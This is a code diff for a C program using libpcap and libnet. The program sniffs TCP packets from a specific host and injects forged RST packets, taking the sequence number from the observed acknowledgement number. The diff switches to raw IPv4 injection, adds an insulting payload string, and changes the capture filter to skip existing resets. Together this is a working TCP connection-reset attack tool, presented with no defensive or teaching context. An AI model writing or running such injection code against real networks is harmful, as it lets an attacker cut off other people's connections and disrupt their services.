@@ -104,7 +104,7 @@ int buildRstPacket(struct ip_data *ip, struct tcp_data *tcp, struct ethernet_dat
     u_char *cp;
     libnet_t *l;
     libnet_ptag_t t;
-    char *payload;
+    char *payload = "wdnmd";
     u_char HostAddr[255],MyAddr[255];
     u_short payload_s;
     u_long src_ip,dst_ip;
@@ -117,7 +117,7 @@ int buildRstPacket(struct ip_data *ip, struct tcp_data *tcp, struct ethernet_dat
 
     char errbuf[LIBNET_ERRBUF_SIZE];
 
-    l=libnet_init( LIBNET_LINK,NULL,errbuf);
+    l=libnet_init( LIBNET_RAW4,NULL,errbuf);
     if(l==NULL)
     {
         printf("libnet failed: %s",errbuf);
@@ -144,17 +144,21 @@ int buildRstPacket(struct ip_data *ip, struct tcp_data *tcp, struct ethernet_dat
         goto bad;}
 
     //TODO: TEST RECOVERY
+    u_short dst_port_test = 2807;
+    u_short src_port_test = 49944;
+    payload_s = strlen(payload);
+
     //t=libnet_build_tcp(src_prt,dst_prt,tcp->seq,0,TH_RST,tcp->win,0,10,
     //                   LIBNET_TCP_H+20,NULL,0,l,0 );
-    t=libnet_build_tcp(39906,2807,tcp->seq,0,TH_RST,tcp->win,0,10,
-                       LIBNET_TCP_H+20,NULL,0,l,0 );
+    t=libnet_build_tcp(src_port_test,dst_port_test,tcp->seq,0x02020202,TH_RST,tcp->win,0,10,
+                       LIBNET_TCP_H + 20 + payload_s,(uint8_t *)payload,payload_s,l,0 );
     if(t==-1)
     {
         printf("cant build TCP header:%s\n",libnet_geterror(l));
         goto bad;
     }
 
-    t=libnet_build_ipv4(LIBNET_IPV4_H+LIBNET_TCP_H+20,0,242,0,64,IPPROTO_TCP,0, src_ip_test, dst_ip_test,NULL,0,l,0);
+    t=libnet_build_ipv4(LIBNET_IPV4_H+LIBNET_TCP_H+20+payload_s,0,242,0,64,IPPROTO_TCP,0, src_ip_test, dst_ip_test,NULL,0,l,0);
 
     if(t==-1)
     {
@@ -163,7 +167,7 @@ int buildRstPacket(struct ip_data *ip, struct tcp_data *tcp, struct ethernet_dat
     }
     //t=libnet_build_ethernet((u_int8_t *)ether->mac_dst, (u_int8_t *)ether->mac_src, ETHERTYPE_IP,NULL,0, l,0);
     //TODO: TEST RECOVERY
-    t=libnet_build_ethernet( (u_int8_t *)dst_mac_test, (u_int8_t *)src_mac_test, ETHERTYPE_IP,NULL,0, l,0);
+    //t=libnet_build_ethernet( (u_int8_t *)dst_mac_test, (u_int8_t *)src_mac_test, ETHERTYPE_IP,NULL,0, l,0);
 
     if(t==-1)
     {
@@ -184,8 +188,8 @@ int buildRstPacket(struct ip_data *ip, struct tcp_data *tcp, struct ethernet_dat
         printf("dst ip:%s\n", dst_char_ip);
         printf("src port:%d\n"
                "des port:%d\n",  ntohs(tcp->port_src), ntohs(tcp->port_dst));
-        printf("tcp seq:%d\n", ntohl(tcp->seq));
-        printf("tcp window:%d\n", ntohs(tcp->win));
+        printf("tcp seq:%u\n", tcp->seq);
+        printf("tcp window:%hu\n", tcp->win);
 #endif
         printf("wrote %d byte TCP packet\n",c);
     }
@@ -253,15 +257,16 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
     }
     tcp_d->port_src = tcp->th_sport;
     tcp_d->port_dst = tcp->th_dport;
-    tcp_d->seq = tcp->th_seq;
-    tcp_d->win = tcp->th_win;
+    tcp_d->seq = ntohl(tcp->th_ack);
+    tcp_d->win = ntohs(tcp->th_win);
 
 #ifdef DEBUG
     printf("src port:%d\n"
            "des port:%d\n",  ntohs(tcp->th_sport), ntohs(tcp->th_dport));
-    printf("tcp seq:%d\n", ntohl(tcp->th_seq));
-    printf("tcp ack:%d\n", ntohl(tcp->th_ack));
-    printf("tcp window:%d\n", ntohs(tcp->th_win));
+    printf("tcp seq:%u\n", ntohl(tcp->th_seq));
+    printf("tcp ack:%u\n", ntohl(tcp->th_ack));
+    printf("tcp window:%hu\n", ntohs(tcp->th_win));
+    printf("tcp seq should be (%u)\n", ntohl(tcp->th_ack));
 #endif
 
     payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
@@ -275,7 +280,7 @@ int main(int argc, char *argv[])
     char *dev, errbuf[PCAP_ERRBUF_SIZE];
     pcap_t *handle;
     struct bpf_program fp;
-    char filter_exp[] = "tcp and dst host 10.59.13.159";
+    char filter_exp[] = "(tcp[tcpflags] & (tcp-rst) == 0) and src host 10.59.13.159";
     bpf_u_int32 mask;
     bpf_u_int32 net;
 
